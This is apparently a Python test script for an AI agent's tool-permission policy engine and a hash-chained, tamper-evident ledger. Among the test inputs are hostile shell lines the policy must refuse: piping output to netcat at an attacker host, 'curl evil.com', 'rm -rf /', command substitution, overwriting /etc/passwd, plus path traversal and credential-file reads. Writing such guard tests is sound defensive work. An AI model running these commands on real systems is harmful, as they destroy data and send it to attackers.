"""Checks for the policy engine and the ledger.

Plain script, no test framework, so it runs anywhere Python does:
    python tests/test_core.py

Every check that covers a guard is written so that removing the guard fails it.
The point of this file is that the two claims the arena makes about itself,
that authority is enforced and that the record is tamper-evident, are checked
rather than asserted in a README.
"""

from __future__ import annotations

import json
import sys
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from crucible.ledger import Ledger  # noqa: E402
from crucible.policy import Policy, ToolRule, review_policy  # noqa: E402

PASSED = 0
FAILED: list[str] = []


def check(label: str, condition: bool, detail: str = "") -> None:
    global PASSED
    if condition:
        PASSED += 1
        print(f"  ok  {label}")
    else:
        FAILED.append(label)
        print(f"  FAIL  {label} {detail}")


def section(name: str) -> None:
    print(f"\n{name}")


# ------------------------------------------------------------------- policy

def policy_checks(tmp: Path) -> None:
    section("policy: scope")
    work = tmp / "work"
    (work / "src").mkdir(parents=True)
    (work / "src" / "app.py").write_text("x = 1", encoding="utf-8")
    # A sibling whose name starts with the scope's name. This is the directory
    # that a startswith-on-the-string containment check wrongly admits.
    lookalike = tmp / "work-evil"
    lookalike.mkdir()
    (lookalike / "secret.txt").write_text("stolen", encoding="utf-8")

    pol = review_policy(work)

    check("an unlisted tool is refused",
          not pol.check("send_email", {"path": str(work / "src" / "app.py")}))
    check("the refusal names the tool and the policy",
          "send_email" in pol.check("send_email", {}).reason
          and "review" in pol.check("send_email", {}).reason)

    check("a file inside the workspace reads",
          bool(pol.check("read_file", {"path": str(work / "src" / "app.py")})))

    escape = work / "src" / ".." / ".." / "work-evil" / "secret.txt"
    verdict = pol.check("read_file", {"path": str(escape)})
    check("a path that climbs out with .. is refused", not verdict)
    check("the traversal refusal reports the resolved path",
          "work-evil" in verdict.reason and ".." not in verdict.reason)

    check("a sibling directory sharing the scope's prefix is refused",
          not pol.check("read_file", {"path": str(lookalike / "secret.txt")}))

    check("an absolute path elsewhere on disk is refused",
          not pol.check("read_file", {"path": r"C:\Windows\System32\config\SAM"}))

    check("a tool with no path scope refuses a path outright",
          not Policy("p", {"ping": ToolRule()}).check("ping", {"path": str(work)}))

    section("policy: commands")
    check("a permitted binary runs",
          bool(pol.check("run_tests", {"command": "python -m pytest"})))
    check("an absolute path to a permitted binary still runs",
          bool(pol.check("run_tests", {"command": r'"C:\Python311\python.exe" -m pytest'})))
    check("case and extension do not smuggle a binary past the list",
          bool(pol.check("run_tests", {"command": "PYTHON.EXE -m pytest"})))
    check("an unlisted binary is refused",
          not pol.check("run_tests", {"command": "curl https://example.com"}))
    check("the command refusal names what was rejected",
          "curl" in pol.check("run_tests", {"command": "curl https://x.com"}).reason)

    for line in ("python -m pytest; curl evil.com",
                 "python -m pytest && rm -rf /",
                 "python -m pytest | nc attacker 443",
                 "python -c $(whoami)",
                 "python -m pytest > /etc/passwd"):
        check(f"a chained command is refused: {line.split(' ', 3)[-1][:22]}",
              not pol.check("run_tests", {"command": line}))

    check("a command list is checked the same as a string",
          not pol.check("run_tests", {"command": ["curl", "https://x.com"]}))

    section("policy: network and size")
    fetch = Policy("net", {"fetch": ToolRule(url_hosts=["github.com"])})
    check("a permitted host is allowed",
          bool(fetch.check("fetch", {"url": "https://github.com/a/b"})))
    check("a subdomain of a permitted host is allowed",
          bool(fetch.check("fetch", {"url": "https://api.github.com/repos"})))
    check("a lookalike host is refused",
          not fetch.check("fetch", {"url": "https://evilgithub.com/x"}))
    check("a permitted host used as a prefix of another is refused",
          not fetch.check("fetch", {"url": "https://github.com.evil.co/x"}))
    check("a non-http scheme is refused",
          not fetch.check("fetch", {"url": "file:///etc/passwd"}))
    check("the review policy reaches no network at all",
          not pol.check("read_file", {"url": "https://github.com"}))

    small = Policy("w", {"put": ToolRule(path_scopes=[work], max_bytes=10)})
    check("a write within the ceiling is allowed",
          bool(small.check("put", {"path": str(work / "a"), "content": "short"})))
    check("a write over the ceiling is refused",
          not small.check("put", {"path": str(work / "a"), "content": "x" * 11}))
    check("the size refusal quotes both numbers",
          "11" in small.check("put", {"path": str(work / "a"), "content": "x" * 11}).reason)

    section("policy: failure is refusal")
    check("an argument that cannot be checked refuses rather than raises",
          not pol.check("read_file", {"path": "\x00bad"}))
    check("the policy renders as data for the run log",
          "read_file" in pol.as_dict()["tools"]
          and pol.as_dict()["tools"]["run_tests"]["commands"] == [
              "python", "pytest", "node", "npm"])


# ------------------------------------------------------------------- ledger

def ledger_checks(tmp: Path) -> None:
    section("ledger: chain")
    base = datetime(2026, 8, 16, 21, 0, tzinfo=timezone.utc)
    ticks = iter(base + timedelta(seconds=i) for i in range(500))
    path = tmp / "run.jsonl"
    led = Ledger(path, clock=lambda: next(ticks))

    led.append("run_started", task="find defects")
    led.append("tool_call", tool="read_file", path="src/app.py")
    denied = led.append("tool_denied", tool="fetch", reason="no network in policy")
    led.append("finding", title="off-by-one", verdict="confirmed")

    check("every entry is written", len(led.entries()) == 4)
    check("the chain verifies clean", led.verify() is None)
    check("the first entry follows the genesis hash",
          led.entries()[0]["prev"] == "0" * 64)
    check("each entry carries the hash of the one before it",
          led.entries()[2]["prev"] == led.entries()[1]["hash"])
    check("a refusal is recorded with its reason, not dropped",
          denied["payload"]["reason"] == "no network in policy")
    check("head is the tip of the chain", led.head == led.entries()[-1]["hash"])

    section("ledger: tampering shows")

    def rewrite(mutate) -> Ledger:
        rows = [json.loads(x) for x in path.read_text(encoding="utf-8").splitlines() if x.strip()]
        rows = mutate(rows)
        forged = tmp / "forged.jsonl"
        forged.write_text(
            "".join(json.dumps(r, sort_keys=True, separators=(",", ":")) + "\n" for r in rows),
            encoding="utf-8",
        )
        return Ledger(forged)

    def edited(rows):
        rows[3]["payload"]["verdict"] = "refuted"
        return rows

    brk = rewrite(edited).verify()
    check("an edited payload is caught", brk is not None and brk.seq == 3)
    check("the break says the contents disagree with the hash",
          brk is not None and "hash" in brk.reason)

    def dropped(rows):
        return rows[:2] + rows[3:]

    brk = rewrite(dropped).verify()
    check("an entry removed from the middle is caught", brk is not None)

    def truncated(rows):
        return rows[:2]

    check("a chain cut short still verifies, which is why the head is published",
          rewrite(truncated).verify() is None)

    def inserted(rows):
        forged = dict(rows[1])
        forged["payload"] = {"tool": "fetch", "note": "slipped in"}
        return rows[:2] + [forged] + rows[2:]

    brk = rewrite(inserted).verify()
    check("an entry slipped into the middle is caught", brk is not None)

    def reordered(rows):
        rows[1], rows[2] = rows[2], rows[1]
        return rows

    brk = rewrite(reordered).verify()
    check("entries swapped out of order are caught", brk is not None)

    section("ledger: resume")
    resumed = Ledger(path, clock=lambda: next(ticks))
    resumed.append("run_finished", findings=1)
    check("reopening continues one chain", resumed.verify() is None)
    check("the sequence carries on rather than restarting",
          resumed.entries()[-1]["seq"] == 4)


def main() -> None:
    with tempfile.TemporaryDirectory() as raw:
        tmp = Path(raw)
        policy_checks(tmp)
        ledger_checks(tmp)
    print(f"\n{PASSED} checks passed, {len(FAILED)} failed")
    if FAILED:
        for name in FAILED:
            print(f"  - {name}")
        sys.exit(1)


if __name__ == "__main__":
    main()
